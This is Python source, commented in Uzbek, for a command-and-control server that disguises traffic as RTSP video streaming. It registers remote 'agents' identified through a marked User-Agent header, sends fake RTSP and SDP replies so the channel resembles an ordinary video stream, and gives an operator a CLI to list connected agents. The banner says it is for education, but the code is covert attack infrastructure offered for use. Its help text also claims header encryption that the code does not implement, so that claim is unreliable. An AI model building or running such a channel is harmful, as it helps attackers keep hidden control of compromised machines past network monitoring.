"""
RTSP C2 Server - Covert Channel over Video Streaming
Video streaming protokoli orqali yashirin aloqa
"""

import socket
import threading
from datetime import datetime
import re
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))


class RTSPC2Server:
    """RTSP C2 Server - Video streaming cover channel"""
    
    def __init__(self, host='0.0.0.0', port=554):
        self.host = host
        self.port = port
        self.running = False
        self.agents = {}
        self.sessions = {}
        self.socket = None
        
    def start(self):
        """RTSP server ishga tushirish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(10)
            self.running = True
            
            print(f"\n{'='*60}")
            print(f"🎯 RTSP C2 Server - Video Streaming Covert Channel")
            print(f"⚠️  Faqat ta'lim maqsadida!")
            print(f"{'='*60}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🎬 RTSP Server: {self.host}:{self.port}")
            print(f"\n📺 RTSP URLs:")
            print(f"  • rtsp://localhost:{self.port}/stream")
            print(f"  • rtsp://localhost:{self.port}/c2channel")
            print(f"\n💡 Global ulanish:")
            print(f"  • rtsp://YOUR_PUBLIC_IP:{self.port}/stream")
            print(f"  • Port forwarding: {self.port} (TCP)")
            print(f"\n🎭 Covert Channel: Ma'lumotlar RTSP headerlarda")
            print(f"{'-'*60}\n")
            
            # Accept thread
            accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
            accept_thread.start()
            
            # CLI loop
            self._cli_loop()
            
        except PermissionError:
            print(f"❌ Port {self.port} uchun administrator huquqlari kerak!")
            print("💡 Boshqa port ishlatish: RTSPServer(port=8554)")
        except Exception as e:
            print(f"❌ RTSP Server xatosi: {e}")
            
    def _accept_loop(self):
        """Client qabul qilish"""
        while self.running:
            try:
                client, addr = self.socket.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(client, addr),
                    daemon=True
                ).start()
            except:
                if self.running:
                    continue
                    
    def _handle_client(self, client, addr):
        """RTSP client boshqaruvi"""
        try:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 RTSP ulanish: {addr[0]}:{addr[1]}")
            
            while self.running:
                data = client.recv(4096)
                if not data:
                    break
                    
                request = data.decode('utf-8', errors='ignore')
                
                # Parse RTSP request
                lines = request.split('\r\n')
                if not lines:
                    continue
                    
                request_line = lines[0]
                
                # Extract method and URL
                match = re.match(r'(\w+)\s+rtsp://([^/]+)(/.+)?\s+RTSP/(\d\.\d)', request_line)
                if not match:
                    continue
                    
                method = match.group(1)
                url_path = match.group(3) or '/'
                
                # Extract headers
                headers = {}
                for line in lines[1:]:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                        
                # Check for C2 data in User-Agent or custom headers
                user_agent = headers.get('User-Agent', '')
                if 'C2AGENT' in user_agent:
                    # Extract agent ID from User-Agent
                    agent_id = user_agent.split('C2AGENT-')[1].split()[0]
                    
                    if agent_id not in self.agents:
                        self.agents[agent_id] = {
                            'address': addr,
                            'first_seen': datetime.now(),
                            'last_seen': datetime.now(),
                            'requests': 0
                        }
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🎬 Yangi RTSP agent: {agent_id}")
                    
                    self.agents[agent_id]['last_seen'] = datetime.now()
                    self.agents[agent_id]['requests'] += 1
                    
                # Send RTSP response
                response = self._create_rtsp_response(method, url_path, headers)
                client.send(response.encode())
                
        except Exception as e:
            print(f"❌ RTSP client xatosi: {e}")
        finally:
            client.close()
            
    def _create_rtsp_response(self, method, url_path, headers):
        """RTSP response yaratish"""
        cseq = headers.get('CSeq', '0')
        session_id = headers.get('Session', str(hash(datetime.now())))
        
        if method == 'OPTIONS':
            response = f"RTSP/1.0 200 OK\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"Public: OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN\r\n"
            response += f"Server: RTSP-C2/1.0\r\n"
            response += f"\r\n"
            
        elif method == 'DESCRIBE':
            sdp = (
                "v=0\r\n"
                "o=- 0 0 IN IP4 127.0.0.1\r\n"
                "s=C2 Stream\r\n"
                "c=IN IP4 0.0.0.0\r\n"
                "t=0 0\r\n"
                "m=video 0 RTP/AVP 96\r\n"
                "a=rtpmap:96 H264/90000\r\n"
            )
            
            response = f"RTSP/1.0 200 OK\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"Content-Type: application/sdp\r\n"
            response += f"Content-Length: {len(sdp)}\r\n"
            response += f"Server: RTSP-C2/1.0\r\n"
            response += f"\r\n"
            response += sdp
            
        elif method == 'SETUP':
            response = f"RTSP/1.0 200 OK\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"Session: {session_id}\r\n"
            response += f"Transport: RTP/AVP;unicast;client_port=8000-8001\r\n"
            response += f"Server: RTSP-C2/1.0\r\n"
            response += f"\r\n"
            
        elif method == 'PLAY':
            response = f"RTSP/1.0 200 OK\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"Session: {session_id}\r\n"
            response += f"RTP-Info: url={url_path}\r\n"
            response += f"Server: RTSP-C2/1.0\r\n"
            response += f"\r\n"
            
        elif method == 'TEARDOWN':
            response = f"RTSP/1.0 200 OK\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"Session: {session_id}\r\n"
            response += f"Server: RTSP-C2/1.0\r\n"
            response += f"\r\n"
            
        else:
            response = f"RTSP/1.0 501 Not Implemented\r\n"
            response += f"CSeq: {cseq}\r\n"
            response += f"\r\n"
            
        return response
        
    def _cli_loop(self):
        """CLI loop"""
        while self.running:
            try:
                cmd = input("RTSP-C2> ").strip().lower()
                
                if cmd == 'agents':
                    self._show_agents()
                elif cmd == 'status':
                    print(f"🟢 RTSP Server: {self.host}:{self.port}")
                    print(f"📊 Agents: {len(self.agents)}")
                elif cmd == 'help':
                    self._show_help()
                elif cmd == 'quit':
                    self.stop()
                    break
                    
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Xato: {e}")
                
    def _show_agents(self):
        """Agentlarni ko'rsatish"""
        if not self.agents:
            print("📭 Agentlar yo'q")
            return
            
        print(f"\n📊 RTSP Agents ({len(self.agents)}):")
        print(f"{'-'*70}")
        print(f"{'ID':<20} {'IP:Port':<25} {'Requests':<10} {'Last Seen'}")
        print(f"{'-'*70}")
        
        for agent_id, info in self.agents.items():
            addr = info['address']
            requests = info['requests']
            last_seen = info['last_seen'].strftime('%H:%M:%S')
            print(f"{agent_id:<20} {addr[0]}:{addr[1]:<19} {requests:<10} {last_seen}")
        print()
        
    def _show_help(self):
        """Yordam"""
        print("""
╔════════════════════════════════════════════════════════╗
║          RTSP C2 Server - Komandalar                   ║
╠════════════════════════════════════════════════════════╣
║  agents              - RTSP agentlarni ko'rsatish      ║
║  status              - Server statusini ko'rsatish     ║
║  help                - Yordam                          ║
║  quit                - Chiqish                         ║
╠════════════════════════════════════════════════════════╣
║  🎭 Covert Channel - Video streaming yashirin kanal    ║
║  📡 Ma'lumotlar RTSP headerlarda shifrlangan           ║
║  🎬 VLC player bilan normal stream kabi ko'rinadi      ║
╚════════════════════════════════════════════════════════╝
        """)
        
    def stop(self):
        """Serverni to'xtatish"""
        print("\n🛑 RTSP Server to'xtatilmoqda...")
        self.running = False
        if self.socket:
            self.socket.close()
        print("✅ RTSP Server to'xtatildi")


if __name__ == "__main__":
    # Port 554 - standart RTSP, administrator kerak
    # Port 8554 - alternate port
    server = RTSPC2Server(host='0.0.0.0', port=8554)
    server.start()
